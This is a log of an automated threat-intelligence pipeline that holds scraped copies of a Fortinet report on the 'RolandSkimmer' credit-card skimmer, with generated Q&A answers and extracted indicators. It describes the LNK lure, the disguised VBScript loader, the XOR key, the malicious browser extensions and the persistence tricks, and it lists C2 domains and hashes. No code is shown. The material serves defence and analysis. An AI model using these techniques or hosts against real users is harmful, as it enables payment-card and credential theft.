trial\n\n- Privacy\n- Legal\n- Accessibility\n- Terms of Use\n- Sitemap\n\nCopyright ©2025 Trend Micro Incorporated. All rights reserved."}}
{"metadata" : {"ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://www.trendmicro.com/en_us/research/25/e/tiktok-videos-infostealers.html", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "keywords_found": [], "article_textual_content": null}, "outputs" : {"output": ""}}
{"metadata" : {"revision_id": "f656170-dirty", "ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://www.fortinet.com/blog/threat-research/rolandskimmer-silent-credit-card-thief-uncovered", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "mitre_ttps": null, "keywords_found": [], "article_textual_content": null}, "outputs" : {"qna": [{"answer": "It is a credit card skimming malware, specifically a web-based credit card skimmer known as \"RolandSkimmer\".", "question": "What kind of malware is it?"}, {"answer": "It involves a web-based credit card skimming attack, specifically using malicious browser extensions across Chrome, Edge, and Firefox.", "question": "What kind of attack does it involve?"}, {"answer": "Yes, the malware uses web inject to steal sensitive user data, including credit card information, by injecting malicious scripts into web pages.", "question": "Does the malware using web inject?"}, {"answer": "Yes, the malware is designed to steal form data, login credentials, and credit card information from the browser.", "question": "Is there credential theft from the browser?"}, {"answer": "Yes, the malware installs malicious browser extensions, including for Chrome, by downloading files from \"fzhivka-001-site1.btempurl.com\" which include extension configurations and malicious scripts for Chrome.", "question": "Does the malware install malicious chrome extension?"}, {"answer": "The RolandSkimmer threat steals sensitive financial data, including credit card information.", "question": "Does is steals credit cards or bank information?"}, {"answer": "The RolandSkimmer is related to credit card skimming, which involves stealing sensitive financial data, including credit card information. While it's not specifically referred to as a wallet stealer, it has similar goals of stealing financial information.", "question": "Is it related to wallet stealer?"}, {"answer": "The malware, known as RolandSkimmer, steals sensitive financial data, including credit card information, such as credit card numbers. It also monitors user interactions, including form submissions, browsing activity, and login credentials.", "question": "What kind of information the malware steals?"}, {"answer": "The stolen information is sent to the attacker's command-and-control (C2) server via an HTTPS request with specific parameters in the URL.", "question": "Where does it forward the stolen information?"}, {"answer": "The threat actor targets users in Bulgaria. There is no specific mention of targeted banks or wallets, but the malware is designed to steal credit card information, including Visa and MasterCard numbers.", "question": "What are the targeted located (regions, banks name, wallets)?"}], "url": "https://www.fortinet.com/blog/threat-research/rolandskimmer-silent-credit-card-thief-uncovered", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [{"type": "Domain or URL", "value": "invsetmx[.]com"}, {"type": "Domain or URL", "value": "fzhivka-001-site1[.]btempurl[.]com"}, {"type": "Domain or URL", "value": "exmkleo[.]com"}, {"type": "Domain or URL", "value": "bg3dsec[.]com"}, {"type": "Domain or URL", "value": "zzigi20-001-site1.atempurl.com"}, {"type": "Domain or URL", "value": "topclima-001-site1.itempurl.com"}, {"type": "Domain or URL", "value": "rinootracebg-001-site1.etempurl.com"}, {"type": "Domain or URL", "value": "mgproperties-001-site1.itempurl.com"}, {"type": "Domain or URL", "value": "kleoti-001-site1.htempurl.com"}, {"type": "Domain or URL", "value": "hxxp://invsetmx[.]com/n.jpg"}, {"type": "Domain or URL", "value": "hxxps://exmkleo[.]com"}, {"type": "SHA256 Hash", "value": "80e0aa05ffd973decf9b7f435c5a44574e4c8314c152c7a09e00c821828fe515"}, {"type": "SHA256 Hash", "value": "e30eecb53e4b03cfada8791877c3c67e009d25bb4d57f01f9eb7cd1121ac1908"}, {"type": "SHA256 Hash", "value": "e0898e5d1f71bb0311ddfdef9697f684da6da701ad36ab8107dcb5d5e438838d"}], "mitre_ttps": null, "keywords_found": ["banking trojan", "botnet", "intelligence", "analysis", "browser", "apt", "threat", "bank", "malicious", "phishing"], "article_textual_content": "# RolandSkimmer: Silent Credit Card Thief Uncovered\n\n- Article Contents\n\nAffected Platforms: Microsoft Windows\n\nImpacted Users: Microsoft Windows\n\nImpact: Collects victim’s sensitive information\n\nSeverity Level: High\n\nWeb-based credit card skimming remains a widespread and persistent threat, known for its ability to adapt and evolve over time. FortiGuard Labs recently observed a sophisticated campaign dubbed “RolandSkimmer,” named after the unique string “Rol@and4You” found embedded in its payload. This threat actor targets users in Bulgaria and represents a new wave of credit card skimming attacks leveraging malicious browser extensions across Chrome, Edge, and Firefox.\n\n2025 Global Threat Landscape Report\n\nUse this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment.\n\nThe attack is initiated via a deceptive LNK file, which deploys obfuscated scripts to establish persistent and covert access. Once embedded, the malware systematically harvests and exfiltrates sensitive financial data from affected users—often without detection.\n\n## Initial Infection Vector\n\nThe attacker first spreads a malicious ZIP file named “faktura\\_3716804.zip.” Upon extraction, users are confronted with a seemingly harmless shortcut file named “faktura\\_1065170.lnk.”\n\nThis shortcut covertly executes the following hidden command:\n\nThe page “ipa.AsPX” then redirects to the URL “hxxp://invsetmx[.]com/n.jpg.” Despite its “.jpg” extension, this file actually contains an obfuscated VBScript payload. This script initiates a continuous connection loop, polling the attacker’s server for commands marked by a specific delimiter, “-@-”. Once instructions are received, the script decodes the provided hexadecimal data and executes the corresponding malicious commands.\n\nBelow is a network traffic example showing both the regular communication and the encoded commands received from the server.\n\n## Attack Workflow\n\nThe encoded VBScript, delivered through the HTTP response, is executed directly by the original process without writing any files to disk. We obtained the attacker’s scripts from the server invsetmx[.]com, where all payloads are saved with a .dll extension. The following analysis details the activities carried out by the decoded scripts.\n\nFirst, it checks the victim’s environment to see if there are Adobe, Firefox, Roaming, and Chrome folders in a specific path.\n\nIt then performs extensive system reconnaissance by querying hardware details, including CPU specifications, memory size, and operating system information. This collected intelligence helps guide targeted actions and provides attackers with valuable insight into the infected host, preventing them from wasting resources on virtual machines or sandbox environments.\n\nTo target browser extensions, the threat actor downloads additional files from “fzhivka-001-site1.btempurl.com,” which include extension configurations and malicious scripts. The files are categorized by browser: 2ch1.rar to 2ch3.rar for Chrome and 2eg1.rar to 2eg3.rar for Edge. All of these files are XOR-encoded and require decoding using the key “andromeda.”\n\nThe following steps illustrate the procedure for targeting the Microsoft Edge browser. It saves the decoded contents to the directory %APPDATA%\\..\\Local\\s2ch97, which contains key components of the malicious extension: “manifest.json,” “background.js,” and “background2.js.” These files are responsible for configuring the extension and executing its background activities.\n\nThe attacker leverages a malicious Edge browser extension as a critical component in its infection chain, persistence mechanism, and data exfiltration process. Disguised under the seemingly benign name “Disable Content Security Policy,” the extension claims to bypass website CSP protections. This deceptive naming strategy helps obscure its malicious intent while ensuring compatibility with targeted websites.\n\nThe extension’s manifest.json file explicitly requests a broad and highly invasive set of permissions:\n\n- declarativeNetRequest – Allows the extension to intercept and modify network requests made by the browser.\n- browsingData – Grants the ability to manipulate or erase browsing data, including cookies, cache, and history.\n- tabs – Enables control over browser tabs, allowing it to open, close, and monitor the content of any tab the user accesses.\n- storage – Permits the extension to store and retrieve data locally on the user’s device.\n\nThis combination of permissions reveals a deliberately engineered design to dominate the user’s browser—transforming a tool built for convenience into a weapon for surveillance, theft, and deception.\n\nThe background.js file is injected as a content script into every webpage the victim visits. Its functions include tracking the victim using a unique identifier and executing malicious code.\n\nTo generate the identifier, a value called key2 is created based on the current timestamp, including the date, hours, minutes, seconds, and milliseconds. An example format is 21.3.25-164532eg2. This identifier is stored persistently in the browser’s local storage, enabling the attacker to track the same user across sessions.\n\nThe script then retrieves an encrypted payload from a local storage key named kuka. To execute this payload, it injects a deliberately malformed HTML tag—&lt;imaage&gt; instead of a valid &lt;img&gt; or &lt;image&gt; tag. This intentional misspelling causes a loading error, triggering the onerror event handler, which immediately evaluates and executes arbitrary JavaScript defined in background2.js.\n\nThe background2.js script is a persistent service worker for the malicious browser extension. It dynamically constructs remote URLs using heavily obfuscated JavaScript functions named yori1 and yori2. These functions retrieve new scripts from a remote malicious server, “hxxps://exmkleo[.]com,” enabling continuous updates to the malicious payloads.\n\n\n\nThe retrieved payloads—also obfuscated JavaScript snippets—are stored within the browser's local storage under the key “kuka.”\n\nThe malicious scripts downloaded from “hxxps://exmkleo[.]com” are designed to monitor user interactions—specifically focusing on form submissions, browsing activity, and credit card data. The skimmer monitors DOM elements for input fields containing sensitive payment information, such as credit card numbers. It explicitly targets standard credit card numbering conventions, such as Visa (starting with a 4) and MasterCard (beginning with a 5).\n\nAfter detecting potential credit card data, the script actively binds to form submission and button-click events, intercepting user input just before submission. For data exfiltration, it leverages hidden &lt;a&gt; elements and appends a unique marker string—Rol@and4You—to help track or validate stolen data. The use of randomized URL paths combined with hidden elements significantly reduces detection risk, increasing the likelihood of successful data theft.\n\nOnce the data is captured, the script sends an HTTPS request to its command-and-control (C2) server with specific parameters in the URL (S:Site, D:Data, and N:Credit Card Number):\n\nAttackers then achieve persistence by performing the following sophisticated operations. Notably, they do not directly tamper with or modify the legitimate Edge browser binaries. Instead, they copy the legitimate Microsoft Edge executable (msedge.exe) into a concealed folder (%APPDATA%\\Edge SxS).\n\nThe critical component of this attack lies in the maliciously crafted LNK file with the following arguments:\n\nThe LNK file triggers the loading of the malicious browser extension and script configuration in the “s2ch97” folder. To complete the deception, the attackers remove legitimate Edge shortcuts from both the Desktop and Taskbar, replacing them with these modified, malicious shortcuts—ensuring the victim unknowingly launches the infected browser environment.\n\nThe attacker uses a different attack method for Mozilla Firefox, leveraging downloaded files named “as1.rar” through “as6.rar.”\n\nThese decoded RAR files represent a complete package of malicious Firefox extension components and supporting scripts. Each serves a distinct role in emulating a legitimate extension environment and forcing its installation.\n\n- as1.rar: The JSON file describes two Mozilla Firefox browser extensions: Greasemonkey and Tampermonkey. These extensions allow users to customize how web pages look or behave by running small JavaScript scripts.\n\n- as2.rar: A compressed file used by Mozilla Firefox to store metadata about installed extensions in a user’s profile\n\n- as3.rar: This JSON file includes both built-in and user-installed extensions, along with details such as version, type, permissions, and file paths. Firefox uses this file during startup to load and manage its extensions.\n\n- as4.rar: Includes setting Firefox preferences.\n\n- as5.rar: The actual tampermonkey.xpi file (version 4.7.5788).\n- as6.rar: This archive contains a malicious script specifically designed to be auto-imported by Tampermonkey, a popular userscript manager. Once installed, the script enables the theft of form data, login credentials, and credit card information. The decoded server identifier “kok1” corresponds to hxxps://exmkleo[.]com, from which the attackers download a script similar to the one used in the Edge attack procedure.\n\nBy leveraging these files together, the attacker can simulate a fully valid Firefox user profile with a preinstalled and functioning Tampermonkey extension. By copying these files into the victim’s environment, the malware ensures Firefox boots with the attacker's malicious extension already enabled.\n\nOnce all the browsers’ related settings are complete, mshta.exe is killed.\n\nUpon examining the remote server where the original LNK file was hosted, we discovered several victim log files. These files were hex-encoded, and the full infection process within the victim’s environment was documented.\n\nThese logs included status messages such as:\n\n- “mz out, roaming in, ch in” – indicating the environment check found no Firefox installation but detected a Roaming folder and Chrome browser.\n- “eg found...desk lnk ok” – confirming that Edge was present and the malicious LNK file had been successfully placed on the Desktop.\n\nThese logs suggest the malware performs adaptive behavior based on the target’s environment, customizing its infection path accordingly.\n\n## Conclusion\n\n“RolandSkimmer” underscores the growing sophistication of LNK-based threats, demonstrating how attackers can exploit legitimate system tools and scripting capabilities to achieve stealth, persistence, and data exfiltration. This campaign notably relies on a malicious browser extension as a core component of its infection chain, enabling long-term access and the continuous theft of sensitive user data, including credit card information.\n\nThe attackers employ carefully crafted JavaScript payloads, misleading manifest files, and obfuscated VBScripts to maintain persistence across sessions and evade detection. To reduce the risk of such infections, users should avoid opening unknown LNK files, especially those delivered via email or from untrusted sources. Organizations should also restrict or monitor the use of unverified browser extensions and implement security tools capable of detecting unusual script activity.\n\n### Fortinet Protections\n\nThe malware described in this report are detected and blocked by FortiGuard Antivirus as:\n\nLNK/Agent.96F1!tr\n\nJS/Agent.SOM!tr\n\nVBS/Agent.ABUE!tr\n\nFortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard Antivirus Service. The FortiGuard antivirus engine is part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected.\n\nThe FortiGuard CDR (content disarm and reconstruction) service can disarm the malicious macros within the document.\n\nWe also suggest that organizations take the free Fortinet Fortinet Certified Fundamentals (FCF) cybersecurity training. The training is designed to help users learn about today's threat landscape and introduces basic cybersecurity concepts and technology.\n\nFortiGuard IP Reputation and Anti-Botnet Security Service proactively block malware attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources.\n\nIf you believe this or any other cybersecurity threat has impacted your organization, please contact the Global FortiGuard Incident Response Team.\n\n## IOCs\n\n#### C2\n\ninvsetmx[.]com\n\nfzhivka-001-site1[.]btempurl[.]com\n\nexmkleo[.]com\n\nbg3dsec[.]com\n\nzzigi20-001-site1.atempurl.com\n\ntopclima-001-site1.itempurl.com\n\nrinootracebg-001-site1.etempurl.com\n\nmgproperties-001-site1.itempurl.com\n\nkleoti-001-site1.htempurl.com\n\n#### SHA256\n\n ZIP\n\n80e0aa05ffd973decf9b7f435c5a44574e4c8314c152c7a09e00c821828fe515\n\ne30eecb53e4b03cfada8791877c3c67e009d25bb4d57f01f9eb7cd1121ac1908\n\ne0898e5d1f71bb0311ddfdef9697f684da6da701ad36ab8107dcb5d5e438838d\n\n#### LNK\n\n86fedcd08d32eeff8a4caa9c2d4ae65b6cea89698570e8ce172a4e82c7f296f1\n\n7086f0ec83dab46aaaecbc459275d7df4e32f50d950047a9235dfccb3da9b9e0\n\n#### SCRIPT\n\n4a852420ca4a32d9ade0a50b8e24d6fc4886151c44477a62ee961ce880b1f8d2\n\ncd6180a612852167a2a1b6c456618a3716d040c163a63e50c17236660e4e7e53\n\nc02d73011204637141fdcc4240b65896b7624508eb116543acfbe3bf7fa29eb4\n\n5810cbdd316eb37ad49ab277604209deb73306c5254eac39164ae626e5aadf6c\n\nCara Lin\n\n### Related Posts\n\nFortiGuard Labs Threat Research\n\n##### Coyote Banking Trojan: A Stealthy Attack via LNK Files\n\nFortiGuard Labs Threat Research\n\n##### Horabot Unleashed: A Stealthy Phishing Threat\n\nFortiGuard Labs Threat Research\n\n##### New Banking Trojan “CHAVECLOAK” Targets Brazil\n\n#### News &amp; Articles\n\n- News Releases\n- News Articles\n\n#### Security Research\n\n- Threat Research\n- FortiGuard Labs\n- Threat Map\n- Ransomware Prevention\n\n#### Connect With Us\n\n- Fortinet Community\n- Partner Portal\n- Investor Relations\n- Product Certifications\n\n#### Company\n\n- About Us\n- Exec Mgmt\n- Careers\n- Training\n- Events\n- Industry Awards\n- Social Responsibility\n- CyberGlossary\n- Sitemap\n- Blog Sitemap\n\n#### Contact Us\n\n- (866) 868-3678\n\nCopyright © 2025 Fortinet, Inc. All Rights Reserved\n\nAlso of Interest:\n\n- Progress against vulnerabilities\n- Network Security Vulnerabilities\n- Leader in Gartner Magic Quadrant for SD-WAN\n- FortiGuard Labs Threat Research"}}
{"metadata" : {"revision_id": "f656170-dirty", "ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://www.fortinet.com/blog/threat-research/rolandskimmer-silent-credit-card-thief-uncovered", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "mitre_ttps": null, "keywords_found": [], "article_textual_content": null}, "outputs" : {"qna": [{"answer": "It is a credit card skimming malware, specifically a web-based credit card skimmer known as \"RolandSkimmer\".", "question": "What kind of malware is it?"}, {"answer": "It involves a web-based credit card skimming attack, specifically a sophisticated campaign dubbed \"RolandSkimmer\" that targets users in Bulgaria and leverages malicious browser extensions.", "question": "What kind of attack does it involve?"}, {"answer": "Yes, the malware uses web inject to steal sensitive user data, including credit card information, by injecting malicious scripts into web pages.", "question": "Does the malware using web inject?"}, {"answer": "Yes, the malware is designed to steal form data, login credentials, and credit card information from the browser.", "question": "Is there credential theft from the browser?"}, {"answer": "Yes, the malware installs malicious browser extensions, including for Chrome, by downloading files from \"fzhivka-001-site1.btempurl.com\" which include extension configurations and malicious scripts for Chrome.", "question": "Does the malware install malicious chrome extension?"}, {"answer": "The RolandSkimmer threat steals sensitive financial data, including credit card information.", "question": "Does is steals credit cards or bank information?"}, {"answer": "The RolandSkimmer is related to credit card skimming, which involves stealing sensitive financial data, including credit card information, but it is not specifically referred to as a wallet stealer in the provided context.", "question": "Is it related to wallet stealer?"}, {"answer": "The malware, known as RolandSkimmer, steals sensitive financial data, including credit card information, such as credit card numbers. It also monitors user interactions, including form submissions, browsing activity, and login credentials.", "question": "What kind of information the malware steals?"}, {"answer": "The stolen information is sent to the attacker's command-and-control (C2) server via an HTTPS request with specific parameters in the URL.", "question": "Where does it forward the stolen information?"}, {"answer": "The threat actor targets users in Bulgaria. There is no specific mention of targeted banks or wallets, but the malware is designed to steal credit card information, including Visa and MasterCard numbers.", "question": "What are the targeted located (regions, banks name, wallets)?"}], "url": "https://www.fortinet.com/blog/threat-research/rolandskimmer-silent-credit-card-thief-uncovered", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [{"type": "Domain or URL", "value": "invsetmx[.]com"}, {"type": "Domain or URL", "value": "fzhivka-001-site1[.]btempurl[.]com"}, {"type": "Domain or URL", "value": "exmkleo[.]com"}, {"type": "Domain or URL", "value": "bg3dsec[.]com"}, {"type": "Domain or URL", "value": "zzigi20-001-site1.atempurl.com"}, {"type": "Domain or URL", "value": "topclima-001-site1.itempurl.com"}, {"type": "Domain or URL", "value": "rinootracebg-001-site1.etempurl.com"}, {"type": "Domain or URL", "value": "mgproperties-001-site1.itempurl.com"}, {"type": "Domain or URL", "value": "kleoti-001-site1.htempurl.com"}, {"type": "Domain or URL", "value": "hxxp://invsetmx[.]com/n.jpg"}, {"type": "Domain or URL", "value": "hxxps://exmkleo[.]com"}, {"type": "SHA256 Hash", "value": "80e0aa05ffd973decf9b7f435c5a44574e4c8314c152c7a09e00c821828fe515"}, {"type": "SHA256 Hash", "value": "e30eecb53e4b03cfada8791877c3c67e009d25bb4d57f01f9eb7cd1121ac1908"}, {"type": "SHA256 Hash", "value": "e0898e5d1f71bb0311ddfdef9697f684da6da701ad36ab8107dcb5d5e438838d"}], "mitre_ttps": null, "keywords_found": ["analysis", "botnet", "apt", "banking trojan", "browser", "bank", "phishing", "malicious", "threat", "intelligence"], "article_textual_content": "# RolandSkimmer: Silent Credit Card Thief Uncovered\n\n- Article Contents\n\nAffected Platforms: Microsoft Windows\n\nImpacted Users: Microsoft Windows\n\nImpact: Collects victim’s sensitive information\n\nSeverity Level: High\n\nWeb-based credit card skimming remains a widespread and persistent threat, known for its ability to adapt and evolve over time. FortiGuard Labs recently observed a sophisticated campaign dubbed “RolandSkimmer,” named after the unique string “Rol@and4You” found embedded in its payload. This threat actor targets users in Bulgaria and represents a new wave of credit card skimming attacks leveraging malicious browser extensions across Chrome, Edge, and Firefox.\n\n2025 Global Threat Landscape Report\n\nUse this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment.\n\nThe attack is initiated via a deceptive LNK file, which deploys obfuscated scripts to establish persistent and covert access. Once embedded, the malware systematically harvests and exfiltrates sensitive financial data from affected users—often without detection.\n\n## Initial Infection Vector\n\nThe attacker first spreads a malicious ZIP file named “faktura\\_3716804.zip.” Upon extraction, users are confronted with a seemingly harmless shortcut file named “faktura\\_1065170.lnk.”\n\nThis shortcut covertly executes the following hidden command:\n\nThe page “ipa.AsPX” then redirects to the URL “hxxp://invsetmx[.]com/n.jpg.” Despite its “.jpg” extension, this file actually contains an obfuscated VBScript payload. This script initiates a continuous connection loop, polling the attacker’s server for commands marked by a specific delimiter, “-@-”. Once instructions are received, the script decodes the provided hexadecimal data and executes the corresponding malicious commands.\n\nBelow is a network traffic example showing both the regular communication and the encoded commands received from the server.\n\n## Attack Workflow\n\nThe encoded VBScript, delivered through the HTTP response, is executed directly by the original process without writing any files to disk. We obtained the attacker’s scripts from the server invsetmx[.]com, where all payloads are saved with a .dll extension. The following analysis details the activities carried out by the decoded scripts.\n\nFirst, it checks the victim’s environment to see if there are Adobe, Firefox, Roaming, and Chrome folders in a specific path.\n\nIt then performs extensive system reconnaissance by querying hardware details, including CPU specifications, memory size, and operating system information. This collected intelligence helps guide targeted actions and provides attackers with valuable insight into the infected host, preventing them from wasting resources on virtual machines or sandbox environments.\n\nTo target browser extensions, the threat actor downloads additional files from “fzhivka-001-site1.btempurl.com,” which include extension configurations and malicious scripts. The files are categorized by browser: 2ch1.rar to 2ch3.rar for Chrome and 2eg1.rar to 2eg3.rar for Edge. All of these files are XOR-encoded and require decoding using the key “andromeda.”\n\nThe following steps illustrate the procedure for targeting the Microsoft Edge browser. It saves the decoded contents to the directory %APPDATA%\\..\\Local\\s2ch97, which contains key components of the malicious extension: “manifest.json,” “background.js,” and “background2.js.” These files are responsible for configuring the extension and executing its background activities.\n\nThe attacker leverages a malicious Edge browser extension as a critical component in its infection chain, persistence mechanism, and data exfiltration process. Disguised under the seemingly benign name “Disable Content Security Policy,” the extension claims to bypass website CSP protections. This deceptive naming strategy helps obscure its malicious intent while ensuring compatibility with targeted websites.\n\nThe extension’s manifest.json file explicitly requests a broad and highly invasive set of permissions:\n\n- declarativeNetRequest – Allows the extension to intercept and modify network requests made by the browser.\n- browsingData – Grants the ability to manipulate or erase browsing data, including cookies, cache, and history.\n- tabs – Enables control over browser tabs, allowing it to open, close, and monitor the content of any tab the user accesses.\n- storage – Permits the extension to store and retrieve data locally on the user’s device.\n\nThis combination of permissions reveals a deliberately engineered design to dominate the user’s browser—transforming a tool built for convenience into a weapon for surveillance, theft, and deception.\n\nThe background.js file is injected as a content script into every webpage the victim visits. Its functions include tracking the victim using a unique identifier and executing malicious code.\n\nTo generate the identifier, a value called key2 is created based on the current timestamp, including the date, hours, minutes, seconds, and milliseconds. An example format is 21.3.25-164532eg2. This identifier is stored persistently in the browser’s local storage, enabling the attacker to track the same user across sessions.\n\nThe script then retrieves an encrypted payload from a local storage key named kuka. To execute this payload, it injects a deliberately malformed HTML tag—&lt;imaage&gt; instead of a valid &lt;img&gt; or &lt;image&gt; tag. This intentional misspelling causes a loading error, triggering the onerror event handler, which immediately evaluates and executes arbitrary JavaScript defined in background2.js.\n\nThe background2.js script is a persistent service worker for the malicious browser extension. It dynamically constructs remote URLs using heavily obfuscated JavaScript functions named yori1 and yori2. These functions retrieve new scripts from a remote malicious server, “hxxps://exmkleo[.]com,” enabling continuous updates to the malicious payloads.\n\n\n\nThe retrieved payloads—also obfuscated JavaScript snippets—are stored within the browser's local storage under the key “kuka.”\n\nThe malicious scripts downloaded from “hxxps://exmkleo[.]com” are designed to monitor user interactions—specifically focusing on form submissions, browsing activity, and credit card data. The skimmer monitors DOM elements for input fields containing sensitive payment information, such as credit card numbers. It explicitly targets standard credit card numbering conventions, such as Visa (starting with a 4) and MasterCard (beginning with a 5).\n\nAfter detecting potential credit card data, the script actively binds to form submission and button-click events, intercepting user input just before submission. For data exfiltration, it leverages hidden &lt;a&gt; elements and appends a unique marker string—Rol@and4You—to help track or validate stolen data. The use of randomized URL paths combined with hidden elements significantly reduces detection risk, increasing the likelihood of successful data theft.\n\nOnce the data is captured, the script sends an HTTPS request to its command-and-control (C2) server with specific parameters in the URL (S:Site, D:Data, and N:Credit Card Number):\n\nAttackers then achieve persistence by performing the following sophisticated operations. Notably, they do not directly tamper with or modify the legitimate Edge browser binaries. Instead, they copy the legitimate Microsoft Edge executable (msedge.exe) into a concealed folder (%APPDATA%\\Edge SxS).\n\nThe critical component of this attack lies in the maliciously crafted LNK file with the following arguments:\n\nThe LNK file triggers the loading of the malicious browser extension and script configuration in the “s2ch97” folder. To complete the deception, the attackers remove legitimate Edge shortcuts from both the Desktop and Taskbar, replacing them with these modified, malicious shortcuts—ensuring the victim unknowingly launches the infected browser environment.\n\nThe attacker uses a different attack method for Mozilla Firefox, leveraging downloaded files named “as1.rar” through “as6.rar.”\n\nThese decoded RAR files represent a complete package of malicious Firefox extension components and supporting scripts. Each serves a distinct role in emulating a legitimate extension environment and forcing its installation.\n\n- as1.rar: The JSON file describes two Mozilla Firefox browser extensions: Greasemonkey and Tampermonkey. These extensions allow users to customize how web pages look or behave by running small JavaScript scripts.\n\n- as2.rar: A compressed file used by Mozilla Firefox to store metadata about installed extensions in a user’s profile\n\n- as3.rar: This JSON file includes both built-in and user-installed extensions, along with details such as version, type, permissions, and file paths. Firefox uses this file during startup to load and manage its extensions.\n\n- as4.rar: Includes setting Firefox preferences.\n\n- as5.rar: The actual tampermonkey.xpi file (version 4.7.5788).\n- as6.rar: This archive contains a malicious script specifically designed to be auto-imported by Tampermonkey, a popular userscript manager. Once installed, the script enables the theft of form data, login credentials, and credit card information. The decoded server identifier “kok1” corresponds to hxxps://exmkleo[.]com, from which the attackers download a script similar to the one used in the Edge attack procedure.\n\nBy leveraging these files together, the attacker can simulate a fully valid Firefox user profile with a preinstalled and functioning Tampermonkey extension. By copying these files into the victim’s environment, the malware ensures Firefox boots with the attacker's malicious extension already enabled.\n\nOnce all the browsers’ related settings are complete, mshta.exe is killed.\n\nUpon examining the remote server where the original LNK file was hosted, we discovered several victim log files. These files were hex-encoded, and the full infection process within the victim’s environment was documented.\n\nThese logs included status messages such as:\n\n- “mz out, roaming in, ch in” – indicating the environment check found no Firefox installation but detected a Roaming folder and Chrome browser.\n- “eg found...desk lnk ok” – confirming that Edge was present and the malicious LNK file had been successfully placed on the Desktop.\n\nThese logs suggest the malware performs adaptive behavior based on the target’s environment, customizing its infection path accordingly.\n\n## Conclusion\n\n“RolandSkimmer” underscores the growing sophistication of LNK-based threats, demonstrating how attackers can exploit legitimate system tools and scripting capabilities to achieve stealth, persistence, and data exfiltration. This campaign notably relies on a malicious browser extension as a core component of its infection chain, enabling long-term access and the continuous theft of sensitive user data, including credit card information.\n\nThe attackers employ carefully crafted JavaScript payloads, misleading manifest files, and obfuscated VBScripts to maintain persistence across sessions and evade detection. To reduce the risk of such infections, users should avoid opening unknown LNK files, especially those delivered via email or from untrusted sources. Organizations should also restrict or monitor the use of unverified browser extensions and implement security tools capable of detecting unusual script activity.\n\n### Fortinet Protections\n\nThe malware described in this report are detected and blocked by FortiGuard Antivirus as:\n\nLNK/Agent.96F1!tr\n\nJS/Agent.SOM!tr\n\nVBS/Agent.ABUE!tr\n\nFortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard Antivirus Service. The FortiGuard antivirus engine is part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected.\n\nThe FortiGuard CDR (content disarm and reconstruction) service can disarm the malicious macros within the document.\n\nWe also suggest that organizations take the free Fortinet Fortinet Certified Fundamentals (FCF) cybersecurity training. The training is designed to help users learn about today's threat landscape and introduces basic cybersecurity concepts and technology.\n\nFortiGuard IP Reputation and Anti-Botnet Security Service proactively block malware attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources.\n\nIf you believe this or any other cybersecurity threat has impacted your organization, please contact the Global FortiGuard Incident Response Team.\n\n## IOCs\n\n#### C2\n\ninvsetmx[.]com\n\nfzhivka-001-site1[.]btempurl[.]com\n\nexmkleo[.]com\n\nbg3dsec[.]com\n\nzzigi20-001-site1.atempurl.com\n\ntopclima-001-site1.itempurl.com\n\nrinootracebg-001-site1.etempurl.com\n\nmgproperties-001-site1.itempurl.com\n\nkleoti-001-site1.htempurl.com\n\n#### SHA256\n\n ZIP\n\n80e0aa05ffd973decf9b7f435c5a44574e4c8314c152c7a09e00c821828fe515\n\ne30eecb53e4b03cfada8791877c3c67e009d25bb4d57f01f9eb7cd1121ac1908\n\ne0898e5d1f71bb0311ddfdef9697f684da6da701ad36ab8107dcb5d5e438838d\n\n#### LNK\n\n86fedcd08d32eeff8a4caa9c2d4ae65b6cea89698570e8ce172a4e82c7f296f1\n\n7086f0ec83dab46aaaecbc459275d7df4e32f50d950047a9235dfccb3da9b9e0\n\n#### SCRIPT\n\n4a852420ca4a32d9ade0a50b8e24d6fc4886151c44477a62ee961ce880b1f8d2\n\ncd6180a612852167a2a1b6c456618a3716d040c163a63e50c17236660e4e7e53\n\nc02d73011204637141fdcc4240b65896b7624508eb116543acfbe3bf7fa29eb4\n\n5810cbdd316eb37ad49ab277604209deb73306c5254eac39164ae626e5aadf6c\n\nCara Lin\n\n### Related Posts\n\nFortiGuard Labs Threat Research\n\n##### Coyote Banking Trojan: A Stealthy Attack via LNK Files\n\nFortiGuard Labs Threat Research\n\n##### Horabot Unleashed: A Stealthy Phishing Threat\n\nFortiGuard Labs Threat Research\n\n##### New Banking Trojan “CHAVECLOAK” Targets Brazil\n\n#### News &amp; Articles\n\n- News Releases\n- News Articles\n\n#### Security Research\n\n- Threat Research\n- FortiGuard Labs\n- Threat Map\n- Ransomware Prevention\n\n#### Connect With Us\n\n- Fortinet Community\n- Partner Portal\n- Investor Relations\n- Product Certifications\n\n#### Company\n\n- About Us\n- Exec Mgmt\n- Careers\n- Training\n- Events\n- Industry Awards\n- Social Responsibility\n- CyberGlossary\n- Sitemap\n- Blog Sitemap\n\n#### Contact Us\n\n- (866) 868-3678\n\nCopyright © 2025 Fortinet, Inc. All Rights Reserved\n\nAlso of Interest:\n\n- Progress against vulnerabilities\n- 